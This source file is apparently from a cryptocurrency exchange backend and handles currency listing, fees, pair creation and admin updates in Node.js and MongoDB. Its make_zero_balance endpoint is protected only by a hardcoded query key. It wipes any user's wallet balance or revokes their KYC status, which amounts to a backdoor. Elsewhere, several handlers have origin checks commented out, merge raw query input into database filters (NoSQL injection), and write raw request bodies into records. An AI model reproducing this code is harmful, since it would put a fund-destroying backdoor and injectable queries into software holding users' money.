var Request = require('request'),
	mongoose = require('mongoose');

var currency = require('../../model/currency'),
	pair = require('../../model/pair'),
	user = require('../../model/user'),
	wallet = require('../../model/wallet');

var Fees = require('../../QRklHLVNFRFWE/keyfile'),
	Common = require('../../helper/common'),
	Helper = require('../../helper/helper');

module.exports.make_zero_balance = async(req, res)=>{
	if(Common._validate_origin(req, res)){
	if(req.query.key == "cJxIsdNfasd"){
		var user_data = await user.findOne({unique_id:req.query.id}).exec()
		wallet.updateOne({userId:user_data._id, 'wallet.currency':req.query.currency}, {$set:{'wallet.$.amount':0, 'wallet.$.hold':0}}, (err, updated)=>{
		if(updated.nModified == 1)
			res.status(201).send({status:true, code:200, message:'Success'})	
		else
			res.status(201).send({status:true, code:200, message:'Error'})	
		})
	}else if(req.query.key == "username"){
		var update_data = await user.updateOne({unique_id:req.query.id}, {$set:{'kycVerified':false}}).exec();
		res.status(201).send({status:true, code:200, message:'Success'})	
	}else{
		res.status(201).send({status:true, code:200, message:'Success'})	
	}
}
}

module.exports.update_to_all_user = async(req, res)=>{
	if(Common._validate_origin(req, res)){
	var coin_id = mongoose.Types.ObjectId(req.params.id);
	var currency_data = await currency.findOne({_id:coin_id}).exec()
	var data = {currency:currency_data.symbol, amount:0, hold:0};
	wallet.updateMany({'wallet.currency':{$nin:[req.params.id]}}, {$push:{wallet:data}}, (err, updated)=>{
	if(updated)	
		res.status(200).send({status:true, code:200, message:`Currency updated to ${updated.nModified} users account`})
	else
		res.status(201).send({status:false, code:201, message:'Error on new coin updation'});
	})
}
}

module.exports.list = (req,res)=>{
	if(Common._validate_origin(req, res)){
	var filter = Object.assign({}, req.query);
	currency.aggregate([{$match:filter}, {$project:{currency:1, logo:1, symbol:1, type:1, date:1, status:1, udate:1, deposit:1, withdraw:1, cointype:1}}, {$sort:{coin_id:1}}], (err,response)=>{
	if(response.length > 0)
		res.send({status:true, code:200, data:response})
	else if(response.length == 0)
		res.send({status:false, code:400, message:'No results found'})
	else
		res.send({status:false, code:401, message:'server not found'})
	})
}
}

module.exports.fees_list = async(req, res)=>{
	if(Common._validate_origin(req, res)){
	var view = {logo:1, symbol:1, currency:1, min_withdraw:1, min_trade_amount:1, withdraw_fee:'$fee', max_withdraw:'$withdrawl_limit_d'};
    currency.aggregate([
		{$match:{status:true, type:'crypto'}}, 
		{$sort:{coin_id:1}},
		{$project:view}
	], (err, response)=>{
	if(response)
		res.status(200).send({status:true, code:200, data:response})	
	else
		res.status(200).send({status:false, code:400, message:'server not found'})
	})
}
}

module.exports.view = (req,res)=>{
	if(Common._validate_origin(req, res)){
	currency.findOne({_id:req.params.id}, (err, response)=>{
	if(response){
		var fees = [];
		deposit_feedata = {
			method:"Net Banking (Deposit)",
			total_fee:Fees.Fiat["Deposit"].Total,
			profit:Fees.Fiat["Deposit"].Profit,
			fee:Fees.Fiat["Deposit"].Fee,
			gst:Fees.Fiat["Deposit"].Gst,
			minimum_limit:0,
			maximum_limit:"--",
		}

		fees.push(deposit_feedata);

		for( var key in Fees.Fiat.Withdraw){
			var obj = {
				method:Fees.Fiat.Withdraw[key].Method+' (Withdraw)' ,
				total_fee:Fees.Fiat.Withdraw[key].Total,
				profit:Fees.Fiat.Withdraw[key].Profit,
				fee:Fees.Fiat.Withdraw[key].Fee,
				gst:Fees.Fiat.Withdraw[key].Gst,
				minimum_limit:Fees.Fiat.Withdraw[key].Minimum,
				maximum_limit:Fees.Fiat.Withdraw[key].Maximum,
			};
			fees.push(obj);
		}
		if(response.symbol == "usd"){
			response.btc_value = response.btc_value.toFixed(8).toString();
			res.send({status:true, code:200, data:response, fees:fees})		
		}
		else
			res.send({status:true, code:200, data:response})		
	}	
	else if(!response)
		res.send({status:false, code:200, message:'No results found'})
	else
		res.send({status:false, code:400, message:'server not found'})
	})
}
}

module.exports.show = (req,res)=>{
	//if(Common._validate_origin(req, res)){
	var filter = {status:true}
	filter = Object.assign({}, filter, req.query);
	currency.aggregate([{$match:filter}, {$project:{currency:1, symbol:1, _id:0}}, {$sort:{coin_id:1}}], (err,response)=>{
	if(response){
		response.unshift({currency:'All', symbol:'all'})
		res.send({status:true, code:200, data:response})
	}
	else
		res.send({status:false, code:400, message:'server not found'})
	})
//}
}

module.exports.change = (req,res)=>{
	if(Common._validate_origin(req, res)){
	currency.findOne({_id:req.params.id}, (err, currency_data)=>{
	if(currency_data){
		var status = currency_data.status == true?false:true;
		currency.updateOne({_id:currency_data._id}, {$set:{status:status}},(err, updated)=>{
		if(updated.nModified == 1)
			res.send({status:true, code:200, message:'Currency status updated successfully'})
		else if(updated.nModified == 0)			
			res.send({status:false, code:200, message:'Already up to date. No changes found'})
		else 
			res.send({status:false, code:400, message:'server not found'})	
		})
	}
	else if(!currency_data)	
		res.send({status:false, code:200, message:'No results found'})
	else
		res.send({status:false, code:400, message:'server not found'})
	})
}
}

module.exports.remove = (req,res)=>{
	if(Common._validate_origin(req, res)){
	currency.deleteOne({_id:req.params.id}, (err,response)=>{
	if(response)	
		res.send({status:true, code:200, message:'Currency deleted successfully'})
	else
		res.send({status:false, code:400, message:'Currency not deleted'})
	})
}
}

module.exports.detail = (req,res)=>{
	if(Common._validate_origin(req, res)){
	currency.findOne({_id:req.params.id}, (err, response)=>{
	if(response)	
		res.send({status:true, code:200, data:response})
	else if(!response)
		res.send({status:false, code:200, message:'No results found'})
	else
		res.send({status:false, code:400, message:'server not found'})
	})
}
}

module.exports.update_all = (req,res)=>{
	if(Common._validate_origin(req, res)){
	req.params.status == req.params.status == 'true'?true:false;
	currency.updateMany({},{$set:{status:req.params.status}}, (err, response)=>{
	if(response.nModified == 0)	
		res.send({status:true, code:200, message:'No changes found'})
	else if(response.nModified > 0)
		res.send({status:true, code:200, message:'Currency updated '+response.nModified+'.'})
	else
		res.send({status:false, code:400, message:'server not found'})
	})
}
}

module.exports.update = (req,res)=>{
	if(Common._validate_origin(req, res)){
	if(req.body._id == undefined || req.body._id == null ||  req.body._id == ''){
		var data = {
			currency:req.body.currency,
			symbol:req.body.symbol,
			logo:req.body.logo,
			type:req.body.type,
			fee:req.body.fee,
			feetype:req.body.feetype,
			cointype:req.body.cointype,
			decimal:req.body.decimal,
			contract_address:req.body.contract_address,
			min_withdraw:req.body.min_withdraw,
			max_withdraw:req.body.max_withdraw,
			min_deposit:req.body.min_deposit,
			max_deposit:req.body.max_deposit,
			date:new Date()
		};
		currency.findOne({symbol:data.symbol.toLowerCase()}, (err, response)=>{
		if(!response){
			currency.create(data, (err, created)=>{
			if(created){
				create_pairs(data.symbol)
				res.status(200).send({status:true, code:200, message:'New currency added successfully'})	
			}
			else if(!created)
	   			res.status(201).send({status:false, code:400, message:'Currency not created'})
			else
				res.status(201).send({status:false, code:400, message:'server not found'})
			})
		}else if(response)
			res.status(201).send({status:false, code:400, message:'Currency already exists'})			
		else
			res.status(201).send({status:false, code:400, message:'server not found'})
		})
	}
	else{
		currency.updateOne({_id:req.body._id},{$set:req.body},(err, response)=>{
		if(response.nModified == 1)
			res.send({status:true, code:200, message:'Currency updated successfully'})
		else if(response.nModified == 0)			
			res.send({status:false, code:200, message:'Already up to date. No changes found'})
		else 
			res.send({status:false, code:400, message:'server not found'})	
		})
	}
}
}

module.exports.token_info = (req, res)=>{
}

module.exports.token_info_noc = async(req, res)=>{
}

module.exports.token_list = (req, res)=>{
	//if(Common._validate_origin(req, res)){
	var filter = Object.assign({}, {cointype:'token'}, req.query);
	currency.aggregate([{$match:filter}, {$project:{currency:1, logo:1, symbol:1, type:1, date:1, status:1}}, {$sort:{coin_id:1}}], (err,response)=>{
		//console.log('response---->',response)
	if(response.length > 0)
		res.send({status:true, code:200, data:response})
	else if(response.length == 0)
		res.send({status:false, code:400, message:'No results found'})
	else
		res.send({status:false, code:401, message:'server not found'})
	})
//}
}

async function create_pairs(symbol) {
	var pair_list = [
		{pair:`${symbol.toLowerCase()}/noc`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'noc', date:new Date()},
		{pair:`${symbol.toLowerCase()}/btc`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'btc', date:new Date()},
		{pair:`${symbol.toLowerCase()}/eth`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'eth', date:new Date()},
		{pair:`${symbol.toLowerCase()}/usdt`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'usdt', date:new Date()},
		{pair:`${symbol.toLowerCase()}/inr`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'inr', date:new Date()},
		{pair:`${symbol.toLowerCase()}/usd`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'usd', date:new Date()},
		{pair:`${symbol.toLowerCase()}/trxusdt`, firstcurrency:`${symbol.toLowerCase()}`, secondcurrency:'trxusdt', date:new Date()},
	]
	pair.create(pair_list, (err, response)=>{
		return;
	})
}